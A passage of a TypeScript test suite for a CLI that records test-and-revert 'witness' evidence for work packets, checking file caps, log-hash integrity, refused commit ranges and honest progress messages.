  assert.ok(predicted, `the pre-flight named no toolchain at all:\n${preflight.seen}`);
  assert.notEqual(predicted, "(none resolved)", `no python3 on this machine: ${preflight.seen}`);
  assert.match(predicted!, /^python3 \d+\.\d+/, preflight.seen);

  const run = runEvidence();
  assert.equal(run.status, 0, run.seen);
  const witness = ledgerAt(dir).packets[0].evidence?.witness;
  assert.ok(witness, run.seen);
  // Not "the witness recorded something" — the same string, both sides resolved through the same
  // shell. `witness-check` resolves in the operator's working directory and the witness resolves
  // inside the clone, so a repo pinning its interpreter may legitimately part them (see
  // docs/08-operations.md); this fixture's clone pins nothing, so parting them here means the two
  // paths stopped sharing a shell.
  assert.equal(
    witness!.toolchain,
    predicted,
    `witness-check predicted \`${predicted}\` and the witness recorded \`${witness!.toolchain}\` — ` +
      `the pre-flight and the run resolved through different shells:\n${run.seen}`,
  );
});

test("an evidence run refused at the gate leaves no orphan logs behind", () => {
  // Ordering, not existence. `persistWitnessLogs` sits *after* the `applyAttachEvidence` error
  // check; moving it back above — where it was — leaves two logs on disk with no ledger entry
  // pointing at them, which is precisely what a maintainer cannot later recompute against.
  // 20 files is over orca-fleet's cap of 8, so the witness succeeds and the gate then refuses.
  const { dir, id, logPaths, runEvidence } = evidenceFixture(20);

  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /would touch 20 files; cap is 8/, run.seen);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.status, "parked", "the overflow parks the packet, and that much is saved");
  assert.equal(after.evidence, undefined, "a refusal must not write evidence");
  for (const path of logPaths) {
    assert.equal(exists(path), false, `${path} was written for a run the ledger refused`);
  }
  // The refusal is also the state the operator recovers from: nothing on disk claims a witness.
  assert.equal(runCli(dir, ["advance", id]).status, 1);
});

test("the evidence verb does not narrate a clone it will not perform", () => {
  // The progress line printed "cloning and running `npm test` twice" immediately before
  // `witnessEvidence` refused a sandboxed repo without touching the network. The operator's
  // terminal is a claim surface: a line describing work that never happened is the same defect
  // class as a pointer nobody can follow.
  const { dir, id, stub } = ingestFixture();
  const run = runCli(dir, ["evidence", id, "--base", BASE, "--head", HEAD], stub, {
    E2B_API_KEY: "",
  });
  assert.equal(run.status, 1, run.seen);
  assert.doesNotMatch(run.seen, /cloning/, run.seen);
  // ...and it still says what it is doing, and where the operator goes next.
  assert.match(run.seen, /this CLI does not run e2b sandboxes/);
  assert.match(run.seen, new RegExp(`attach-witness ${id} --manifest <path>`));
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("attach-witness saves the park when the compared range busts the cap", () => {
  // The parked-state save on the ingest path was reachable by no test: deleting the
  // `if (parked) saveFactoryState(...)` line left the suite green, and the operator would then
  // re-run into the same refusal with no record that the packet had been parked at all.
  // mcp-use's cap is 4 files; the stub reports 10.
  const { dir, id, manifestPath, stub } = ingestFixture({}, {}, 10);
  assert.equal(ledgerAt(dir).packets[0].status, "reviewing");

  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /would touch 10 files; cap is 4/, run.seen);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.status, "parked", "the park must survive the refusal, not vanish with the process");
  assert.equal(after.evidence, undefined, "parked is not attached");
  assert.match(after.parkReason ?? "", /cap is 4/);
});

test("a witness whose two logs hash the same is not a negative control", () => {
  // `testCommand: "true"` produces no output at all, so both runs hash to sha256 of the empty
  // string and the evidence page offers `e3b0c442…` twice as its recompute. The exit codes can
  // still differ, so `revertExit !== 0` does not catch it — the digests have to.
  const empty = createHash("sha256").update("").digest("hex");
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id, { testLogSha: empty, revertLogSha: empty })),
    bindingFor(packet),
  );
  assert.match(attached.error ?? "", /hash to the same sha256 e3b0c44/);
  assert.equal(attached.state.packets[0].evidence, undefined);
  // And the gate agrees, so a ledger edited around the reducer cannot promote it either.
  const forged: FactoryState = {
    ...state,
    packets: state.packets.map((p) =>
      p.id === id
        ? {
            ...p,
            evidence: {
              ...manifestWith(
                boundWitness("e2b", packet.repoId, id, { testLogSha: empty, revertLogSha: empty }),
              ),
              shaVerified: true,
            },
          }
        : p,
    ),
  };
  assert.equal(evidenceIsReady(forged.packets[0]), false);
});

test("attach-witness refuses identical log digests even when both logs are on disk", () => {
  // End to end, because this is the shape an honest-looking manifest takes: the two files exist,
  // the hashes recompute correctly, `verifyWitnessLogs` is satisfied — and the pair still proves
  // nothing. The refusal has to come from the gate, after the read succeeds.
  const empty = createHash("sha256").update("").digest("hex");
  const { dir, id, manifestPath, stub } = ingestFixture(
    { testLogSha: empty, revertLogSha: empty },
    { test: "", revert: "" },
  );
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.doesNotMatch(run.seen, /does not match the witness sha256/, "the read itself must succeed");
  assert.match(run.seen, /hash to the same sha256/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("a mis-bound range is refused before the witness runs at all", () => {
  // Ordering proved by observation, not by stopwatch (issue #42). Every `git` the CLI child spawns
  // goes through a shim that records it, and `witnessEvidence`'s first act on the host path is
  // `git clone` — so the claim "the witness never ran" is the record being empty, not the refusal
  // being fast.

  // Positive control first: the recorder is live, and a well-bound range does clone and run twice.
  const bound = evidenceFixture();
  const green = bound.runEvidence();
  assert.equal(green.status, 0, green.seen);
  const clones = bound.gitCalls().filter((line) => line.startsWith("clone "));
  assert.equal(clones.length, 1, `the shim must see the witness clone: ${bound.gitCalls().join(" | ")}`);
  for (const path of bound.logPaths) assert.ok(exists(path), `${path} was never written: ${green.seen}`);

  // Same fixture, same verb, one input changed: a commit range that names no issue at all.
  const { dir, id, logPaths, runEvidence, gitCalls } = evidenceFixture(2, "unrelated refactor");
  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  // This assertion, and not the wall clock, is the claim: no git at all.
  assert.deepEqual(gitCalls(), [], `the witness ran for a range the gate refuses: ${run.seen}`);
  assert.match(run.seen, /does not reference ravidsrk\/orca-fleet#71/, run.seen);
  // ...and therefore neither run happened, so neither log exists.
  for (const path of logPaths) assert.equal(exists(path), false, `${path} was written for a refused range`);
  // ...and the terminal did not narrate a clone it never performed.
  assert.doesNotMatch(run.seen, /cloning/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
  assert.equal(ledgerAt(dir).packets[0].status, "reviewing", "a refusal at the pre-check parks nothing");
  assert.equal(runCli(dir, ["advance", id]).status, 1);
});

test("the pre-check does not let a foreign reference through the evidence verb", () => {
  // The security-relevant half: relaxing the matcher must not start binding someone else's issue
  // number. Driven through the real verb so the pre-check and the reducer are both on the path.
  const { dir, runEvidence, gitCalls } = evidenceFixture(2, "fix the answer\n\nFixes other-owner/other-repo#71");
  const run = runEvidence();
  assert.equal(run.status, 1, run.seen);
  assert.deepEqual(gitCalls(), [], `a foreign reference bought a clone: ${run.seen}`);
  assert.match(run.seen, /does not reference ravidsrk\/orca-fleet#71/, run.seen);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

/**
 * The closed-issue verdict (issue #40). Deliberately a sibling of `classifyCompetition`: same
 * question shape — a live GitHub fact the CLI fetches and the engine judges — and the same posture
 * word, "stand down", that docs/02-good-neighbor.md rule 8 uses for a competing PR.
 */
